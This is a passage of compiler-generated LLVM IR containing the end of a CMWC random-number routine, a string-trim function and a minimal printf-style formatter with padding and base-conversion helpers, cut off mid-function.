  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %282, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %285

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %273

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %285

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %274

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %118

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i64*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i64*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i64* [ %94, %90 ], [ %99, %96 ]
  %103 = load i64, i64* %102, align 8
  %104 = inttoptr i64 %103 to i8*
  store i8* %104, i8** %11, align 8
  %105 = load i8**, i8*** %4, align 8
  %106 = load i8*, i8** %11, align 8
  %107 = icmp ne i8* %106, null
  br i1 %107, label %108, label %110

; <label>:108:                                    ; preds = %101
  %109 = load i8*, i8** %11, align 8
  br label %111

; <label>:110:                                    ; preds = %101
  br label %111

; <label>:111:                                    ; preds = %110, %108
  %112 = phi i8* [ %109, %108 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.117, i32 0, i32 0), %110 ]
  %113 = load i32, i32* %7, align 4
  %114 = load i32, i32* %8, align 4
  %115 = call i32 @prints(i8** %105, i8* %112, i32 %113, i32 %114)
  %116 = load i32, i32* %9, align 4
  %117 = add nsw i32 %116, %115
  store i32 %117, i32* %9, align 4
  br label %282

; <label>:118:                                    ; preds = %80
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 100
  br i1 %122, label %123, label %148

; <label>:123:                                    ; preds = %118
  %124 = load i8**, i8*** %4, align 8
  %125 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %126 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 0
  %127 = load i32, i32* %126, align 8
  %128 = icmp ule i32 %127, 40
  br i1 %128, label %129, label %135

; <label>:129:                                    ; preds = %123
  %130 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 3
  %131 = load i8*, i8** %130, align 8
  %132 = getelementptr i8, i8* %131, i32 %127
  %133 = bitcast i8* %132 to i32*
  %134 = add i32 %127, 8
  store i32 %134, i32* %126, align 8
  br label %140

; <label>:135:                                    ; preds = %123
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %125, i32 0, i32 2
  %137 = load i8*, i8** %136, align 8
  %138 = bitcast i8* %137 to i32*
  %139 = getelementptr i8, i8* %137, i32 8
  store i8* %139, i8** %136, align 8
  br label %140

; <label>:140:                                    ; preds = %135, %129
  %141 = phi i32* [ %133, %129 ], [ %138, %135 ]
  %142 = load i32, i32* %141, align 4
  %143 = load i32, i32* %7, align 4
  %144 = load i32, i32* %8, align 4
  %145 = call i32 @printi(i8** %124, i32 %142, i32 10, i32 1, i32 %143, i32 %144, i32 97)
  %146 = load i32, i32* %9, align 4
  %147 = add nsw i32 %146, %145
  store i32 %147, i32* %9, align 4
  br label %282

; <label>:148:                                    ; preds = %118
  %149 = load i8*, i8** %5, align 8
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 120
  br i1 %152, label %153, label %178

; <label>:153:                                    ; preds = %148
  %154 = load i8**, i8*** %4, align 8
  %155 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %156 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = icmp ule i32 %157, 40
  br i1 %158, label %159, label %165

; <label>:159:                                    ; preds = %153
  %160 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 3
  %161 = load i8*, i8** %160, align 8
  %162 = getelementptr i8, i8* %161, i32 %157
  %163 = bitcast i8* %162 to i32*
  %164 = add i32 %157, 8
  store i32 %164, i32* %156, align 8
  br label %170

; <label>:165:                                    ; preds = %153
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %155, i32 0, i32 2
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to i32*
  %169 = getelementptr i8, i8* %167, i32 8
  store i8* %169, i8** %166, align 8
  br label %170

; <label>:170:                                    ; preds = %165, %159
  %171 = phi i32* [ %163, %159 ], [ %168, %165 ]
  %172 = load i32, i32* %171, align 4
  %173 = load i32, i32* %7, align 4
  %174 = load i32, i32* %8, align 4
  %175 = call i32 @printi(i8** %154, i32 %172, i32 16, i32 0, i32 %173, i32 %174, i32 97)
  %176 = load i32, i32* %9, align 4
  %177 = add nsw i32 %176, %175
  store i32 %177, i32* %9, align 4
  br label %282

; <label>:178:                                    ; preds = %148
  %179 = load i8*, i8** %5, align 8
  %180 = load i8, i8* %179, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 88
  br i1 %182, label %183, label %208

; <label>:183:                                    ; preds = %178
  %184 = load i8**, i8*** %4, align 8
  %185 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %186 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 8
  %188 = icmp ule i32 %187, 40
  br i1 %188, label %189, label %195

; <label>:189:                                    ; preds = %183
  %190 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 3
  %191 = load i8*, i8** %190, align 8
  %192 = getelementptr i8, i8* %191, i32 %187
  %193 = bitcast i8* %192 to i32*
  %194 = add i32 %187, 8
  store i32 %194, i32* %186, align 8
  br label %200

; <label>:195:                                    ; preds = %183
  %196 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %185, i32 0, i32 2
  %197 = load i8*, i8** %196, align 8
  %198 = bitcast i8* %197 to i32*
  %199 = getelementptr i8, i8* %197, i32 8
  store i8* %199, i8** %196, align 8
  br label %200

; <label>:200:                                    ; preds = %195, %189
  %201 = phi i32* [ %193, %189 ], [ %198, %195 ]
  %202 = load i32, i32* %201, align 4
  %203 = load i32, i32* %7, align 4
  %204 = load i32, i32* %8, align 4
  %205 = call i32 @printi(i8** %184, i32 %202, i32 16, i32 0, i32 %203, i32 %204, i32 65)
  %206 = load i32, i32* %9, align 4
  %207 = add nsw i32 %206, %205
  store i32 %207, i32* %9, align 4
  br label %282

; <label>:208:                                    ; preds = %178
  %209 = load i8*, i8** %5, align 8
  %210 = load i8, i8* %209, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 117
  br i1 %212, label %213, label %238

; <label>:213:                                    ; preds = %208
  %214 = load i8**, i8*** %4, align 8
  %215 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = icmp ule i32 %217, 40
  br i1 %218, label %219, label %225

; <label>:219:                                    ; preds = %213
  %220 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 3
  %221 = load i8*, i8** %220, align 8
  %222 = getelementptr i8, i8* %221, i32 %217
  %223 = bitcast i8* %222 to i32*
  %224 = add i32 %217, 8
  store i32 %224, i32* %216, align 8
  br label %230

; <label>:225:                                    ; preds = %213
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 2
  %227 = load i8*, i8** %226, align 8
  %228 = bitcast i8* %227 to i32*
  %229 = getelementptr i8, i8* %227, i32 8
  store i8* %229, i8** %226, align 8
  br label %230

; <label>:230:                                    ; preds = %225, %219
  %231 = phi i32* [ %223, %219 ], [ %228, %225 ]
  %232 = load i32, i32* %231, align 4
  %233 = load i32, i32* %7, align 4
  %234 = load i32, i32* %8, align 4
  %235 = call i32 @printi(i8** %214, i32 %232, i32 10, i32 0, i32 %233, i32 %234, i32 97)
  %236 = load i32, i32* %9, align 4
  %237 = add nsw i32 %236, %235
  store i32 %237, i32* %9, align 4
  br label %282

; <label>:238:                                    ; preds = %208
  %239 = load i8*, i8** %5, align 8
  %240 = load i8, i8* %239, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 99
  br i1 %242, label %243, label %272

; <label>:243:                                    ; preds = %238
  %244 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %245 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 8
  %247 = icmp ule i32 %246, 40
  br i1 %247, label %248, label %254

; <label>:248:                                    ; preds = %243
  %249 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 3
  %250 = load i8*, i8** %249, align 8
  %251 = getelementptr i8, i8* %250, i32 %246
  %252 = bitcast i8* %251 to i32*
  %253 = add i32 %246, 8
  store i32 %253, i32* %245, align 8
  br label %259

; <label>:254:                                    ; preds = %243
  %255 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %244, i32 0, i32 2
  %256 = load i8*, i8** %255, align 8
  %257 = bitcast i8* %256 to i32*
  %258 = getelementptr i8, i8* %256, i32 8
  store i8* %258, i8** %255, align 8
  br label %259

; <label>:259:                                    ; preds = %254, %248
  %260 = phi i32* [ %252, %248 ], [ %257, %254 ]
  %261 = load i32, i32* %260, align 4
  %262 = trunc i32 %261 to i8
  %263 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %262, i8* %263, align 1
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %264, align 1
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %267 = load i32, i32* %7, align 4
  %268 = load i32, i32* %8, align 4
  %269 = call i32 @prints(i8** %265, i8* %266, i32 %267, i32 %268)
  %270 = load i32, i32* %9, align 4
  %271 = add nsw i32 %270, %269
  store i32 %271, i32* %9, align 4
  br label %282

; <label>:272:                                    ; preds = %238
  br label %281

; <label>:273:                                    ; preds = %17
  br label %274

; <label>:274:                                    ; preds = %273, %35
  %275 = load i8**, i8*** %4, align 8
  %276 = load i8*, i8** %5, align 8
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  call void @printchar(i8** %275, i32 %278)
  %279 = load i32, i32* %9, align 4
  %280 = add nsw i32 %279, 1
  store i32 %280, i32* %9, align 4
  br label %281

; <label>:281:                                    ; preds = %274, %272
  br label %282

; <label>:282:                                    ; preds = %281, %259, %230, %200, %170, %140, %111
  %283 = load i8*, i8** %5, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %5, align 8
  br label %12

; <label>:285:                                    ; preds = %29, %12
  %286 = load i8**, i8*** %4, align 8
  %287 = icmp ne i8** %286, null
  br i1 %287, label %288, label %291

; <label>:288:                                    ; preds = %285
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %289, align 8
  store i8 0, i8* %290, align 1
  br label %291

; <label>:291:                                    ; preds = %288, %285
  %292 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %293 = bitcast %struct.__va_list_tag* %292 to i8*
  call void @llvm.va_end(i8* %293)
  %294 = load i32, i32* %9, align 4
  ret i32 %294
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
